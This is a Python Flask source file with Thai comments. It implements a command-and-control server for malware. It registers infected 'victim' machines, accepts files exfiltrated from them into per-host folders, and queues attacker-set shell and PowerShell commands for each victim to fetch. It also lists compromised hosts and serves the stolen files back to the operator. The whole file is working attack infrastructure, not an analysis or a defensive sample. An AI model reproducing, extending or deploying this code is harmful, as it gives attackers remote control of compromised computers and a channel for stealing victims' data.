from flask import Flask, request, jsonify, send_from_directory, render_template_string
import os

app = Flask(__name__)

# Dictionary เก็บข้อมูลเครื่องที่ติดเชื้อ
infected_machines = {}
current_commands = {}
current_shell = {}

# สร้างโฟลเดอร์ให้ชื่อเครื่องเหยื่อโดยตรง
if not os.path.exists('.'):
    os.makedirs('.')  # สร้าง directory ถ้าจำเป็น

@app.route("/report", methods=["POST"])
def report():
    """รับข้อมูลจาก Client ที่ติดเชื้อ"""
    data = request.json
    hostname = data.get("hostname")
    ip = data.get("ip")

    # สร้างโฟลเดอร์สำหรับเครื่องแต่ละเครื่อง
    machine_folder = os.path.join('.', hostname)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)  # สร้างโฟลเดอร์สำหรับเครื่องเหยื่อ

    infected_machines[hostname] = ip  # เก็บข้อมูลเครื่องที่ติดเชื้อ
    print(f"[+] Infected Device : {hostname} ({ip})")
    return jsonify({"status": "reported"})

@app.route("/<hostname>", methods=["POST"])
def upload_file(hostname):
    """รับไฟล์จากเครื่องเหยื่อและบันทึกลงในโฟลเดอร์ของเครื่องนั้น"""
    # สร้างโฟลเดอร์สำหรับเครื่องเหยื่อหากยังไม่มี
    machine_folder = os.path.join('.', hostname)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)  # สร้างโฟลเดอร์สำหรับเครื่องเหยื่อ

    # รับไฟล์จาก request
    file = request.files.get('file')
    if file:
        # ตั้งชื่อไฟล์ตามชื่อเดิม
        file_path = os.path.join(machine_folder, file.filename)
        file.save(file_path)  # บันทึกไฟล์ในโฟลเดอร์

        return jsonify({"status": "File uploaded", "filename": file.filename}), 200
    return jsonify({"error": "No file uploaded"}), 400

@app.route("/<hostname>/command", methods=["GET"])
def command(hostname):
    """ส่งคำสั่งให้ Client ตามชื่อเครื่อง"""
    # ดึงคำสั่งจากเครื่องที่ระบุ
    cmd = current_commands.get(hostname)
    if cmd is None:
        return jsonify({"error": "No command set for this machine"}), 404
    return jsonify({"cmd": cmd})

@app.route("/<hostname>/shell", methods=["GET"])
def shell(hostname):
    pws = current_shell.get(hostname)
    if pws is None:
        return jsonify({"error": "No command set for this machine"}), 404
    return jsonify({"pws": pws})

@app.route("/set_command", methods=["POST"])
def set_command():
    """รับคำสั่งจากแฮกเกอร์ และบันทึกลงระบบ"""
    data = request.json
    hostname = data.get("hostname")  # กำหนดชื่อเครื่องที่จะได้รับคำสั่ง
    cmd = data.get("cmd")
    current_commands[hostname] = cmd  # บันทึกคำสั่งสำหรับเครื่องนั้น
    print(f"[+] Command set for {hostname}: {cmd}")
    return jsonify({"status": "command set", "hostname": hostname, "cmd": cmd})

@app.route("/set_shell", methods=["POST"])
def set_shell():
    """รับคำสั่งจากแฮกเกอร์ และบันทึกลงระบบ"""
    data = request.json
    hostname = data.get("hostname")  # กำหนดชื่อเครื่องที่จะได้รับคำสั่ง
    pws = data.get("pws")
    current_shell[hostname] = pws  # บันทึกคำสั่งสำหรับเครื่องนั้น
    print(f"[+] Shell command set for {hostname}: {pws}")
    return jsonify({"status": "Shell command set", "hostname": hostname, "pws": pws})


@app.route("/list_machines", methods=["GET"])
def list_machines():
    """ดูรายชื่อเครื่องที่ติดเชื้อ"""
    return jsonify(infected_machines)

@app.route("/<hostname>", methods=["GET"])
def directory_listing(hostname):
    """แสดง Directory Listing สำหรับเครื่องที่ติดเชื้อ"""
    machine_folder = os.path.join('.', hostname)

    # เช็คว่าโฟลเดอร์นั้นมีจริงหรือไม่
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine folder not found"}), 404

    return None
    
@app.route("/<hostname>/<filename>", methods=["GET"])
def download_file(hostname, filename):
    """ให้ผู้ใช้ดาวน์โหลดไฟล์จากโฟลเดอร์ของเครื่องเหยื่อ"""
    machine_folder = os.path.join('.', hostname)
    # ส่งไฟล์ที่อยู่ในโฟลเดอร์ของเครื่องนั้น
    return send_from_directory(machine_folder, filename)

if __name__ == "__main__":
    app.run(host="192.168.10.151", port=8080)
